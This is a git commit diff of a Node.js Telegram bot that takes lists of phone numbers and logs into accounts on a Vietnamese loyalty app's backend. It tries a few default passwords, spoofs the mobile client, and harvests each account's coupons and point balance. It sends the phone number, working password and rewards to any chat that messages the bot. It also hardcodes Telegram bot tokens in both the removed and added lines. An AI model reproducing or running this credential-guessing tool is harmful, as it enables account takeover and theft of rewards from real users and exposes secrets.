4fc5246b931b86998a88844a1de583b206e177e4
tungdzai <87531719+tungdzai@users.noreply.github.com>
2024-09-14 05:08:10 +0700

    Update index.js

--- index.js
+++ index.js
@@ -2,76 +2,106 @@ const axios = require('axios');
 const TelegramBot = require('node-telegram-bot-api');
 const keep_alive = require('./keep_alive.js');
 
-const token = '7292586219:AAEerbRNkRS6atNxLebo_9Ngc_qgFiR99pA';
-const bot = new TelegramBot(token, { polling: true });
-const chatId = '6573357046';
-let  dataPhone = [];
+const token = '7449609039:AAFLCwOX57frCqDP2-2C3ohced3vFqSMBOc';
+const bot = new TelegramBot(token, {polling: true});
+let dataPhone = [];
 
+let chatIds = [];
 
 async function sendTelegramMessage(message) {
-    try {
-        await bot.sendMessage(chatId, message);
-    } catch (error) {
-        console.error("Lỗi gửi tin nhắn đến Telegram:", error);
+    for (const id of chatIds) {
+        try {
+            await bot.sendMessage(id, message);
+        } catch (error) {
+            console.error(`Lỗi gửi tin nhắn đến Telegram (chatId: ${id}):`, error);
+        }
     }
 }
 
-async function login(userName, reties = 2) {
+async function syncProfile(phoneNumber) {
+    const response = await axios.post('https://backend2.tgss.vn/0e96d6b13fb5335193eee7ed50eb5aa0/customers/sync-profile-from-clm', {"phoneNumber": phoneNumber}, {
+        headers: {
+            "user-agent": "Dart/2.18 (dart:io)",
+            "content-type": "application/json",
+            "accept-encoding": "gzip",
+            "content-length": '28',
+            "host": "backend2.tgss.vn"
+        }
+    });
+    return response.data
+
+}
+
+async function loginAcc(userName, reties = 3) {
     let password = "";
     if (reties < 0) {
         return;
     }
-    if (reties === 2) {
+    if (reties === 3) {
         password = "111111";
     }
-    if (reties === 1) {
+    if (reties === 2) {
         password = "666777";
     }
+    if (reties === 1) {
+        password = "777333";
+    }
+
     const data = {
         userName: userName,
         password: password
     };
-    const headers = {
-        "user-agent": "Dart/2.18 (dart:io)",
-        "Content-Type": "application/json",
-        "accept-encoding": 'gzip',
-        "content-length": "45",
-        "host": "backend2.tgss.vn"
-    };
     try {
-        const response = await axios.post('https://backend2.tgss.vn/0e96d6b13fb5335193eee7ed50eb5aa0/customers/login', data, {headers: headers});
+        const response = await axios.post('https://backend2.tgss.vn/0e96d6b13fb5335193eee7ed50eb5aa0/customers/login', data, {
+            headers: {
+                "user-agent": "Dart/2.18 (dart:io)",
+                "content-type": "application/json",
+                "accept-encoding": "gzip",
+                "content-length": '45',
+                "host": "backend2.tgss.vn"
+            }
+        });
         const status = response.data.success;
         if (status) {
             const token = response.data.data.token;
-            return token;
+            return {
+                token: token,
+                password: password
+            };
         }
-        return await login(userName, reties - 1)
-    }catch (e) {
-        const message=`Lỗi đăng nhập ${userName} kiểm tra lại`;
-        console.error(message);
+        return await loginAcc(userName, reties - 1);
+    } catch (error) {
+        const message= `${userName}:Sai mật khẩu mặc định`;
+        console.error(message)
         await sendTelegramMessage(message);
-        return await login(userName, reties - 1)
     }
 
 }
 
-async function exchanges(token) {
-    const url = "https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/posts/exchanges?Status=1&PageIndex=1&PageSize=1000000";
+async function getCoupon(token) {
+    const response = await axios.get("https://backend2.tgss.vn/0e96d6b13fb5335193eee7ed50eb5aa0/posts/exchanges?Status=1&PageIndex=1&PageSize=10000", {
+        headers: {
+            "User-Agent": "Dart/2.18 (dart:io)",
+            "Accept-Encoding": "gzip",
+            "host": "backend2.tgss.vn",
+            "Authorization": `Bearer ${token}`,
+        }
+    })
+    return response.data.data
+}
+
+async function checkPoint(token) {
+    const url = "https://backend2.tgss.vn/0e96d6b13fb5335193eee7ed50eb5aa0/memberships";
     const headers = {
-        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-        "sec-ch-ua-mobile": "?0",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-        "sec-ch-ua-platform": '"Windows"',
-        "Sec-Fetch-Site": "cross-site",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Dest": "empty",
-        "host": "backend2.tgss.vn",
+        "user-agent": 'Dart/2.18 (dart:io)',
+        "clientid": "680dc919-1e70-4f96-9896-1e74f911b5b7",
+        "accept-encoding": "gzip",
         "Authorization": `Bearer ${token}`,
+        'host': 'backend2.tgss.vn'
     }
+
     const response = axios.get(url, {headers: headers});
-    return (await response).data.data
+    return (await response).data.data.memberLevels[0].gCoinOfCurrentLevel
 }
 
 async function exportGift() {
@@ -79,52 +109,43 @@ async function exportGift() {
     const unusedPhones = [];
     let usedCouponCount = 0;
     let hasGiftPostCount = 0;
-
-    for (const phone of dataPhone) {
-        const userName = `0${phone}`;
-        const token = await login(userName);
-        if (token) {
-            const dataGift = await exchanges(token);
-            if (dataGift) {
-                const dataGifts = dataGift.items;
-                let found = false;
-                for (const gifts of dataGifts) {
-                    for (const gift of gifts) {
-                        if (gift.referral !== null){
-                            if (gift.referral.id === '08dcb51a-6d9e-407c-8dfe-fc37a5319ae3') {
-                                const message = `${phone}: ${gift.referral.title}`;
-                                found = true;
-                                usedPhones.push(phone);
-                                hasGiftPostCount++;
-                                console.log(message)
-                                break;
-                            }
+    for (const item of dataPhone) {
+        const userName = `0${item}`;
+        console.log(userName)
+        await syncProfile(userName);
+        const loginResult = await loginAcc(userName);
+        if (loginResult && loginResult.token) {
+            const {token, password} = loginResult;
+            const result = await getCoupon(token);
+            const gCoin = await checkPoint(token);
+            if (result) {
+                const postCoupon = result.items;
+                let title = '';
+                for (const coupons of postCoupon) {
+                    for (const coupon of coupons) {
+                        if (coupon.post) {
+                            title += `:` + coupon.post.title
+                        } else {
+                            title += `:` + coupon.referral.title
                         }
                     }
-                    if (found) break;
                 }
-                if (!found) {
-                    unusedPhones.push(phone);
-                    const message = `${phone}: Đã dùng coupon`;
-                    usedCouponCount++;
-                    console.log(message)
-                }
+                const dataCoupon = `${userName} ${password} gCoin:${gCoin} ${title}`;
+                console.log(`${dataCoupon}`);
+                usedPhones.push(item);
+                hasGiftPostCount++;
+                await sendTelegramMessage(dataCoupon);
             } else {
-                unusedPhones.push(phone);
-                const message = `${phone}: Đã dùng coupon`;
+                unusedPhones.push(item);
+                const message = `${item}: Không còn coupon`;
                 usedCouponCount++;
+                await sendTelegramMessage(message);
                 console.log(message)
             }
-        } else {
-            unusedPhones.push(phone);
-            const message = `${phone}: Đã dùng coupon`;
-            usedCouponCount++;
-            console.log(message)
         }
     }
-
-    const summaryMessage = `Tổng đã dùng : ${usedCouponCount} : ${unusedPhones.join(', ')}\n` +
-        `Tổng chưa dùng ': ${hasGiftPostCount} : ${usedPhones.join(', ')}`
+    const summaryMessage = `Tổng tài khoản rỗng coupon : ${usedCouponCount} : ${unusedPhones.join(', ')}\n` +
+        `Tổng tài khoản còn coupon ': ${hasGiftPostCount} : ${usedPhones.join(', ')}`
     await sendTelegramMessage(summaryMessage);
     dataPhone = [];
 }
@@ -134,35 +155,39 @@ bot.on('message', async (msg) => {
     const messageChatId = msg.chat.id;
     const text = msg.text;
 
-    if (messageChatId.toString() === chatId) {
-        if (text.startsWith('')) {
-            const phones = text.split('\n').slice(0).map(phone => phone.trim());
-            console.log(phones)
-            const invalidPhones = [];
+    console.log(messageChatId);
+    if (!chatIds.includes(messageChatId)) {
+        chatIds.push(messageChatId);
+    }
+    if (text) {
+        const phones = text.split('\n').map(phone => phone.trim());
+        const invalidPhones = [];
 
-            phones.forEach(phone => {
-                if (phone && !isNaN(phone)) {
-                    const phoneNumber = Number(phone);
-                    if (!dataPhone.includes(phoneNumber)) {
-                        dataPhone.push(phoneNumber);
-                    }
-                } else {
-                    invalidPhones.push(phone);
+        phones.forEach(phone => {
+            const phoneMatch = phone.match(/^0?(\d{9})/);
+            if (phoneMatch) {
+                // Extract phone number without the leading zero
+                const phoneNumber = phoneMatch[1];
+                if (!dataPhone.includes(phoneNumber)) {
+                    dataPhone.push(phoneNumber);
                 }
-            });
-            console.log(invalidPhones)
-            let responseMessage = `Danh sách số điện thoại nhập vào:\n${dataPhone.join('\n')}`;
-            if (invalidPhones.length > 0) {
-                responseMessage += `\nSố điện thoại không hợp lệ: ${invalidPhones.join(', ')}`;
+            } else {
+                invalidPhones.push(phone);
             }
-            await sendTelegramMessage(responseMessage);
-            try {
-                await exportGift();
-            } catch (error) {
-                console.error("Lỗi khi chạy exportGift:", error);
-            }
-        } else {
-            await sendTelegramMessage('Lệnh không hợp lệ. Sử dụng "PHONES" và gửi các số điện thoại (mỗi số trên một dòng) để thêm số điện thoại.');
+        });
+        console.log(dataPhone);
+        console.log(invalidPhones);
+        let responseMessage = `Danh sách số điện thoại nhập vào:\n${dataPhone.join('\n')}`;
+        if (invalidPhones.length > 0) {
+            responseMessage += `\nSố điện thoại không hợp lệ: ${invalidPhones.join(', ')}`;
         }
+        await sendTelegramMessage(responseMessage);
+        try {
+            await exportGift();
+        } catch (error) {
+            console.error("Lỗi khi chạy exportGift:", error);
+        }
+    } else {
+        await sendTelegramMessage('Lệnh không hợp lệ');
     }
 });
